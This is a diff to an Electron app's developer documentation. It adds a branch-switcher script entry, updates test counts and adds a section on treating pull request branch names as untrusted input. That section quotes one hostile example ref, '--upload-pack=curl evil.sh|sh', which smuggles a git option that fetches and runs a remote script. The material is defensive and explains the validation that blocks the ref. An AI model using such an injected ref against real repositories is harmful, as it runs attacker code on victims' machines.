@@ -60,6 +60,11 @@ docs/                ARCHITECTURE.md (per-file map) + DECISIONS.md (dated ration
 vite.config.ts       renderer build (three windows). `--mode preview` builds the browser
                      preview instead — preview.html + renderer/dev/, into build-preview/
 scripts/build-main.mjs   esbuild bundling for the main process + preload
+scripts/switch-branch.mjs  the branch switcher's build half: checks a branch out into
+                     its own worktree under userData, builds it, prints where. Runs
+                     standalone (`node scripts/switch-branch.mjs --repo . --branch main
+                     --out /tmp/b`) — a build only reachable from a button is one
+                     nobody can debug
 eslint.config.js     lint config, incl. the `electron`-import boundary rule
 vitest.config.ts     test runner config (node + jsdom projects)
 preview.html         browser-preview entry. NOT `*-window.html` on purpose — see the file
@@ -82,7 +87,7 @@ renderer/__tests__/setup.ts  jsdom setup (browser-API stubs, sonner/toast stub)
 
 ## Testing
 
-**Two systems, one command.** `npm run test:all` = the standalone `check:*` scripts, then Vitest. Both must pass. 1930 Vitest tests across 98 files and 42 checks in the chain as of 2026-08-09 (44 defined — `check:repo-hygiene` and `check:shell-drift` are deliberately outside it; shell-drift needs both branches fetched, which only CI reliably has).
+**Two systems, one command.** `npm run test:all` = the standalone `check:*` scripts, then Vitest. Both must pass. 1977 Vitest tests across 101 files and 43 checks in the chain as of 2026-08-09 (45 defined — `check:repo-hygiene` and `check:shell-drift` are deliberately outside it; shell-drift needs both branches fetched, which only CI reliably has).
 
 - **Vitest** (`vitest.config.ts`) has two projects. **`node`**: `main/**/*.test.ts`, `mcp/**/*.test.ts`, `renderer/lib/**/*.test.ts`. **`dom`** (jsdom): `renderer/**/*.test.tsx`, `renderer/dev/**/*.test.ts`, plus `main/**/*.dom.test.ts` — that suffix is for BACKEND code needing a document (the injected replayer and Auto-Heal probe are evaluated for real). The node project explicitly excludes `*.dom.test.ts`; without that they match both globs and run again with no DOM, failing for unrelated reasons. **A `.ts` test under `renderer/` outside `lib/` or `dev/` matches NEITHER project and is silently never run** — that is why `renderer/dev/**/*.test.ts` is listed by hand.
 - **`check:*` scripts** predate Vitest and are kept, not migrated — they catch real bugs and a rewrite would risk that for tooling neatness. Plain assertions + a non-zero exit; no runner. Two are deliberately *source-level* (`check:ai-debug-scroll`, `check:scroll-layout`) because they guard layout contracts that jsdom cannot observe.
@@ -130,6 +135,17 @@ Importing clones or reads a folder of someone else's Playwright code and copies 
 - **Judge containment on real paths, both sides.** `statSync`/`copyFileSync` follow symlinks, so a repo shipping `helpers.js -> ~/.ssh/id_rsa` would copy that file's contents in. And realpath the ROOT too: on macOS `/var` is a link to `/private/var`, so comparing a resolved path against an unresolved root rejects every legitimate sibling.
 - `testStore.writeScript` writes to the record's existing path when it's inside the scripts dir, so editing an imported spec doesn't move it away from its siblings; `remove` deletes the whole sandbox.
 - Guarded by `check:import-sandbox`.
+
+## A branch name is untrusted input too
+
+The branch switcher (`/branches`, `scripts/switch-branch.mjs`) takes a name from a **pull request's head ref** — chosen by anyone who can open a PR — and hands it to git as an argument *and* uses it to name a directory that is then **checked out, built and executed**. Two separate holes, and the reflex fix helps with neither:
+
+- **`execFile` spawns no shell, so quoting is not the answer.** A ref called `--upload-pack=curl evil.sh|sh` is not command injection; it is an option git honours. Rejecting a leading `-` is what stops it. `--`-separated arguments and explicit refspecs are used as well, but only one of the two can be forgotten at a call site.
+- **`path.resolve` walks `..` as far as it's told**, and what lands at the far end here is a whole checkout that then gets built and run. `worktreeDirFor` refuses any result outside the builds root, on resolved paths, and **throws rather than falling back** — there is no safe default directory.
+
+**One validator, in `shared/branch-paths.mjs`.** The service is compiled TypeScript and the build script is plain `.mjs`; they cannot share a `.ts`, and a transcribed copy of the rule is right the day it's written and silently divergent afterwards. The direction it fails is the script accepting a name the app refuses. Guarded by `check:branch-switch`, which runs the real script against hostile names rather than only scanning source.
+
+**Never let this feature touch the user's checkout.** Builds go into a git worktree under `userData/branch-builds/`. Switching the checkout in place would discard uncommitted work, rewrite the running app's own files, and leave no way back from a branch that doesn't build.
 
 ## Hard constraints
 
